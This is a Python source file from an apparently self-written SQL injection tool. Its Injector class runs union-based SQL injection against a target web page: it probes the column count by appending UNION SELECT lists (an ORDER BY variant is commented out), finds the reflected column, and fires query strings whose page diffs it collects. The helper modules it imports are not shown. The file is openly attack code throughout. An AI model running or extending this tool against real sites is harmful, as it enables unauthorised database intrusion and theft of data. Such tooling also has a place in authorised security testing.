#!/usr/bin/python
import os, sys
import builder, parser, scanner
import re
from collections import Counter
    
class Injector:
    """ Used for basic union-based SQL injection.

    """
    
    # Pass dict of options as param flags
    def __init__(self, page, flags):
        """ Receives strings from builder to inject and passes off output to parser.
            :page:  Web page to perform injections against. 
            :flags: Dict of strings. Keys are flags, values are params.
        """

        self.page = page
        self.flags = flags 
        self.offset = 0 # can be changed to say, self.offset, if 1,2,3,4... found on page a lot
        self.columns_upper_limit_guess = 9

        # Aggregate parts
        self.build = builder.Builder(self.page, [])
        self.parse = parser.Parser('') #hackish
        self.scan = scanner.Scanner()
    
    def get_num_columns(self):
        """ Try unions until no SQL errors returned.
            :returns:   Int. Number of columns in vulnerable statement.
        """
        count = 1
    
        original_page = self.scan.page(self.page)
        ### Using UNION SELECT appending 1,2,... ###
        # Need to differentiate between str and int params
        union = self.page + self.build.union_string + self.build.delimiter + str(count)

        ### Heuristic just looks for SELECT or empty list, needs to be MORE NUANCED!
        while len(self.parse.html_diff(original_page, self.scan.page(union))) == 0 or 'SELECT' in self.parse.html_diff(original_page, self.scan.page(union)):
            count += 1
            union += "," + str(count + self.offset)

        """
        ### Using ORDER BY x--, x = 9,8,... ###
        count = self.columns_upper_limit_guess
        order_by = page + self.delimiter + 'ORDER' + self.delimiter + 'BY' + self.delimiter + str(count) + '--'
        while 'Unknown' in self.parse.html_diff(original_page, self.get_page(order_by)) and count > 0:
            count -= 1
            temp = list(order_by)
            temp[-3] = str(count)
            order_by = "".join(temp)
        """
    
        return count
    
    def get_visible_param(self):
        """ Get most common number appearing in HTML, this is where to inject variables.
            :returns:   String. Most commonly seen number in page, hopefully the injectable param.
        """
        
        # Make query string
        union_urls = self.build.union_nums(self.get_num_columns())
        new_url = self.build.null_url + self.build.union_string + ",".join(union_urls)

        diff = self.parse.html_diff(self.scan.page(self.page), self.scan.page(new_url))
        nums = [filter(str.isdigit, str(re.sub('<.*>','', line))) for line in diff]
        #nums.remove('')

        return Counter(nums).most_common(1)[0][0]
        
    
    def injection(self, queries):
        """ Takes page to fuzz for injections and params to check for.
            :queries: List??? need to check it is always a list.
            :returns:   Dict of lists. Keys are injected strings, values are results.
        """
        default_page = self.scan.page(self.page)
        data = {}
        
        for query in queries:
            data[query] = self.parse.html_diff(default_page, self.scan.page(queries[query]))

        return data

    def pre_comp_injection(self, queries):
        """
        data = {}
        for query in queries:
            data[query] = self.scan.raw_html(queries[query])
        return data
        """

        return {query: self.scan.raw_html(queries[query]) for query in queries}
        

    
    #
